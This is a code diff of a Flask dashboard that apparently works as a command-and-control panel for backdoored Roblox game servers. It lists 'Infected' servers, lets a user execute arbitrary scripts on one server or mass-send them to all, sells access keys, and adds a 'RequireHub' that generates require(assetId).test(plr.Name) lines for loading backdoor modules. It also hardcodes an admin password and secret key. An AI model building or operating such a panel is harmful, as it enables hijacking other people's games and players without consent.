@@ -5,7 +5,7 @@ app = Flask(__name__)
 app.secret_key = "vantage_v30_final_tier"
 MASTER_ADMIN_PW = "SkibidiToiletSigmaRizzler" 
 
-# DATA STORAGE
+# PERSISTENT DATA
 global_servers = {} 
 user_sessions = {}
 valid_keys = {}
@@ -30,15 +30,16 @@ body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; 
 .server-info { font-size: 11px; margin-bottom: 8px; }
 .server-info b { color: var(--gold); }
 .btn { background: var(--gold); color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: 900; cursor: pointer; width: 100%; text-transform: uppercase; font-size: 11px; }
+.btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3); }
 
 @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
-.searching, .executing { animation: pulse 0.8s infinite !important; background: #333 !important; }
+.searching, .executing { animation: pulse 0.8s infinite !important; background: #333 !important; color: #fff !important; }
 
-.key-badge { background: #111; padding: 10px; border-radius: 8px; font-family: monospace; border: 1px solid var(--gold); margin-bottom: 5px; text-align: center; }
 .hidden { display: none !important; }
+.key-badge { background: #111; padding: 10px; border-radius: 8px; font-family: monospace; border: 1px solid var(--gold); margin-bottom: 5px; text-align: center; }
 input, textarea { background: rgba(0,0,0,0.8); border: 1px solid var(--border); padding: 15px; color: #fff; width: 100%; border-radius: 12px; outline: none; margin-bottom: 10px; }
 textarea { color: #0f0; font-family: 'Consolas', monospace; height: 180px; resize: none; }
-.require-box { background: #111; padding: 10px; border-radius: 8px; color: #0f0; font-family: monospace; font-size: 12px; margin-top: 10px; border: 1px dashed var(--master); }
+.require-output { background: #111; padding: 15px; border-radius: 10px; color: #0f0; font-family: monospace; font-size: 13px; border: 1px dashed var(--master); cursor: pointer; }
 """
 
 DASH_HTML = """
@@ -54,6 +55,7 @@ DASH_HTML = """
     {% else %}
     <div class="navbar">
         <div class="nav-item active-nav" onclick="tab('live', this)">Infected</div>
+        <div class="nav-item" onclick="tab('require_hub', this)">RequireHub</div>
         <div class="nav-item" onclick="tab('exec', this)">Executor</div>
         <div class="nav-item" onclick="tab('white', this)">Whitelist</div>
         {% if is_admin %}<div class="nav-item" style="color:var(--accent);" onclick="tab('admin_panel', this)">Admin Panel</div>{% endif %}
@@ -62,10 +64,22 @@ DASH_HTML = """
     <div class="viewport">
         <div id="live" class="tab"><div id="server_grid" class="grid"></div></div>
 
+        <div id="require_hub" class="tab hidden">
+            <div class="card" style="max-width: 600px; margin: auto; text-align: center;">
+                <h2 style="color:var(--gold);">RequireHub</h2>
+                <input id="module_id" placeholder="Enter Asset ID (e.g. 123456789)">
+                <button class="btn" onclick="generateRequire()">CREATE REQUIRE</button>
+                <div id="require_display" class="hidden" style="margin-top:20px;">
+                    <p style="font-size:10px; color:#666;">CLICK TO COPY:</p>
+                    <div id="require_text" class="require-output" onclick="copyText()">require(0).test(plr.Name)</div>
+                </div>
+            </div>
+        </div>
+
         <div id="exec" class="tab hidden">
             <div class="card" style="max-width: 700px; margin: auto;">
                 <p style="font-size:11px;">TARGET: <b id="exec_target" style="color:var(--gold);">NONE</b></p>
-                <textarea id="code_area" placeholder="-- SCRIPT HERE"></textarea>
+                <textarea id="code_area" placeholder="-- PASTE SCRIPT HERE"></textarea>
                 <button id="exec_btn" class="btn" onclick="execute()">EXECUTE</button>
             </div>
         </div>
@@ -93,17 +107,12 @@ DASH_HTML = """
         <div id="master" class="tab hidden">
             <div class="card" style="max-width: 600px; margin: auto; text-align: center;">
                 <h2 style="color:var(--master);">Master Panel</h2>
-                
-                <h3 style="font-size:12px; color:#999; text-align:left;">REQUIRE HUB</h3>
-                <input id="req_id" placeholder="Enter Module ID..." oninput="updateRequire()">
-                <div id="req_output" class="require-box">require(0).test(plr.Name)</div>
-                
-                <textarea id="mass_code" style="height:80px; margin-top:20px;" placeholder="-- MASS SCRIPT"></textarea>
+                <textarea id="mass_code" style="height:80px;" placeholder="-- MASS SCRIPT (ALL SERVERS)"></textarea>
                 <button class="btn" style="background:var(--master); color:#fff;" onclick="massExec()">SEND TO ALL</button>
                 <hr style="border:0; border-top:1px solid #222; margin:20px 0;">
                 <div style="display:flex; gap:10px;">
                     <button class="btn" onclick="genKey('standard', 'key_list_master')">GEN STANDARD</button>
-                    <button class="btn" style="background:var(--accent); color:#fff;" onclick="genKey('admin', 'key_list_master')">GEN ADMIN</button>
+                    <button class="btn" style="background:#bc13fe; color:#fff;" onclick="genKey('admin', 'key_list_master')">GEN ADMIN</button>
                 </div>
                 <div id="key_list_master" style="margin-top:15px;"></div>
             </div>
@@ -114,9 +123,16 @@ DASH_HTML = """
 <script>
     function tab(name, el) { document.querySelectorAll('.tab').forEach(t => t.classList.add('hidden')); document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active-nav')); document.getElementById(name).classList.remove('hidden'); el.classList.add('active-nav'); }
     
-    function updateRequire() {
-        let id = document.getElementById('req_id').value || "0";
-        document.getElementById('req_output').innerText = `require(${id}).test(plr.Name)`;
+    function generateRequire() {
+        let id = document.getElementById('module_id').value || "0";
+        document.getElementById('require_text').innerText = `require(${id}).test(plr.Name)`;
+        document.getElementById('require_display').classList.remove('hidden');
+    }
+
+    function copyText() {
+        let text = document.getElementById('require_text').innerText;
+        navigator.clipboard.writeText(text);
+        alert("Copied to clipboard!");
     }
 
     function sync() {
@@ -217,7 +233,7 @@ def roblox_sync():
                 thumb = t["data"][0]["imageUrl"] if t.get("data") else ""
             except: thumb = ""
             global_servers[jid] = {"thumb": thumb, "place_id": data.get("game_id")}
-        global_servers[jid].update({"name": data.get("name"), "p_count": len(data.get("players", [])), "last_ping": time.time()})
+        global_servers[jid].update({"name": data.get("name"), "p_count": len(data.get("players", []))})
     
     all_cmds = []
     for mc in mass_execute_queue: all_cmds.append({"user": "ALL", "code": mc})
